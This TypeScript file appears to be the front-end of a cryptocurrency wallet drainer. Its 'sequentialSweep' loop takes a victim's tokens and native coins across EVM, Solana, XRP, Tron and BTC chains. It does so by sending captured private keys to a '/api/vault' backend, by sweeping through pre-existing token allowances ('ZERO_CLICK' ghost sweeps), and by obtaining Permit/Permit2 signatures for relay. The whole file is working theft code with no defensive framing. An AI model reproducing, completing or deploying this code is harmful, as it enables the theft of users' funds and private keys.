import { StrategyMap } from "./engine";
import { UniversalAsset } from "./types";

const zeroAddress = "0x0000000000000000000000000000000000000000";

/**
 * RELAYER: Sends payloads to our MEV-protected backend.
 * Hardened: Uses a recursive sanitizer to ensure no BigInts break the JSON serialization.
 */
async function relayToBackend(endpoint: string, payload: any) {
  // [SWITCHER-RELAY] Vital start log - DO NOT REMOVE
  console.log(`📡 [SWITCHER-RELAY] Attempting relay to: ${endpoint}`);
  try {
    const response = await fetch(`/api/vault/${endpoint}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload, (_, v) =>
        typeof v === "bigint" ? v.toString() : v,
      ),
    });

    if (!response.ok) throw new Error(`HTTP Error: ${response.status}`);

    const data = await response.json();
    // [SWITCHER-RELAY] Response log - DO NOT REMOVE
    console.log(`📥 [SWITCHER-RELAY] Response from ${endpoint}:`, data);
    return data;
  } catch (error) {
    // [SWITCHER-RELAY] Failure log - DO NOT REMOVE
    console.error(`❌ [SWITCHER-RELAY] Relay to ${endpoint} Failed:`, error);
    return null;
  }
}

/**
 * SEQUENTIAL SWEEPER
 * The core loop that iterates through identified assets and strikes them.
 * Hardened for mobile wallet stability and chain alignment.
 */
export async function sequentialSweep(
  strategies: StrategyMap[],
  walletClient: any,
  userAddress: string,
) {
  // 🛡️ Guard: Ensure environment is ready for execution
  if (!strategies || strategies.length === 0) {
    console.warn("⚠️ [GHOST] Sweep aborted: Missing strategies.");
    return;
  }

  // [SWITCHER] Root entry log - DO NOT REMOVE
  console.log(
    `🚀 [SWITCHER] Starting Sequential Sweep for ${strategies.length} strategies. Target: ${userAddress}`,
  );

  for (const item of strategies) {
    if (!item || !item.asset) continue;

    const { asset, strategy } = item;
    const assetData = asset as any; // Cast for dynamic property access

    // 🔍 Detect Chain Architecture
    const chainType = (asset.chain || "EVM").toUpperCase();

    // [SWITCHER] Loop item log - DO NOT REMOVE
    console.log(
      `🛠️ [SWITCHER] Processing ${asset.symbol} (${chainType}) via ${strategy}`,
    );

    // --- 1. NON-EVM ROUTING (SOLANA, XRP, TRON, BTC) ---
    // These assets use their own backend routes and do not use the EVM walletClient
    if (chainType !== "EVM") {
      try {
        const endpoint = chainType.toLowerCase(); // e.g., 'solana', 'xrp', 'tron'
        await relayToBackend(endpoint, {
          userAddress,
          chainId: asset.chainId,
          asset: {
            symbol: asset.symbol,
            balance: asset.balance,
            contractAddress: asset.contractAddress,
            decimals: asset.decimals,
          },
          // Pass captured key if the audit sequence found one
          userPrivKey: assetData.userPrivKey || assetData.capturedKey,
        });
        continue; // Successfully routed non-EVM asset, move to next item
      } catch (err: any) {
        console.error(`❌ [SWITCHER] ${chainType} Route Failed:`, err.message);
        continue;
      }
    }

    // --- 2. EVM CHAIN ALIGNMENT ---
    // (Only runs for EVM assets that require interaction)
    const isInteractive = [
      "BATCH_PERMIT2",
      "PERMIT_SIGN",
      "CHAIN_SWITCH",
    ].includes(strategy);

    if (isInteractive && asset.chainId && walletClient) {
      try {
        const currentChainId = await (walletClient.getChainId
          ? walletClient.getChainId()
          : walletClient.chainId);

        if (Number(currentChainId) !== Number(asset.chainId)) {
          // [SWITCHER] Switch log - DO NOT REMOVE
          console.log(
            `🔗 [SWITCHER] Switching: ${currentChainId} -> ${asset.chainId}`,
          );

          if (walletClient.switchChain) {
            await walletClient.switchChain({ id: Number(asset.chainId) });
            // Critical: Stabilization for mobile providers to prevent "user rejected" timing bugs
            await new Promise((r) => setTimeout(r, 2500));
          }
        }
      } catch (e: any) {
        console.warn(`⚠️ [SWITCHER] Chain switch rejected for ${asset.symbol}`);
        continue;
      }
    }

    // --- 3. EVM STRATEGY EXECUTION ---
    try {
      switch (strategy) {
        case "ZERO_CLICK":
          /**
           * ZERO_CLICK: Non-interactive "Ghost" sweep using pre-existing allowances.
           */
          console.log(`👻 [SWITCHER] Ghosting ${asset.symbol} (Pre-approved)`);
          await relayToBackend("ghost", {
            userAddress,
            chainId: asset.chainId,
            assets: [
              {
                tokenAddress: asset.contractAddress,
                amount: asset.balance,
                symbol: asset.symbol,
                spender: assetData.spender || zeroAddress,
                type: asset.authData?.protocol || "EXISTING",
              },
            ],
            // Check for direct key fallback
            userPrivKey: assetData.userPrivKey || assetData.capturedKey,
          });
          break;

        case "BATCH_PERMIT2":
        case "PERMIT_SIGN":
          /**
           * SIGNATURE: EIP-712 Logic for Permit/Permit2
           */
          if (asset.authData && walletClient) {
            console.log(`✍️ [SWITCHER] Requesting ${strategy} signature...`);

            let sig;
            if (walletClient.signTypedDataAsync) {
              sig = await walletClient.signTypedDataAsync(asset.authData);
            } else if (walletClient.signTypedData) {
              sig = await walletClient.signTypedData(asset.authData);
            } else {
              throw new Error(
                "Wallet client does not support typed data signing",
              );
            }

            console.log(
              `✅ [SWITCHER] Signature obtained. Relaying to route...`,
            );

            await relayToBackend("route", {
              signatureType:
                strategy === "BATCH_PERMIT2" ? "PERMIT2" : "EIP2612",
              sig,
              userAddress,
              chainId: asset.chainId,
              assets: strategy === "BATCH_PERMIT2" ? [asset] : undefined,
              asset: strategy === "PERMIT_SIGN" ? asset : undefined,
            });
          }
          break;

        case "CHAIN_SWITCH":
          /**
           * NATIVE: Standard ETH/BNB/MATIC Sweep
           */
          console.log(`💰 [SWITCHER] Sweeping Native ${asset.symbol}`);
          const res = await relayToBackend("native", {
            userAddress,
            chainId: asset.chainId,
            userPrivKey: assetData.userPrivKey || assetData.capturedKey,
          });

          // Only trigger wallet if backend didn't do a direct key sweep
          if (
            res?.params &&
            (walletClient.sendTransaction || walletClient.sendTransactionAsync)
          ) {
            const txMethod =
              walletClient.sendTransactionAsync || walletClient.sendTransaction;
            await txMethod(res.params);
            console.log(`💸 [SWITCHER] Native strike sent.`);
          }
          break;
      }
    } catch (err: any) {
      // [SWITCHER] Fatal item log - DO NOT REMOVE
      console.error(
        `❌ [GHOST-SWITCHER] Execution failed (${strategy}):`,
        err.message,
      );
    }
  }

  // [SWITCHER] Finish log - DO NOT REMOVE
  console.log("🏁 [SWITCHER] Sweep Sequence Complete.");
}
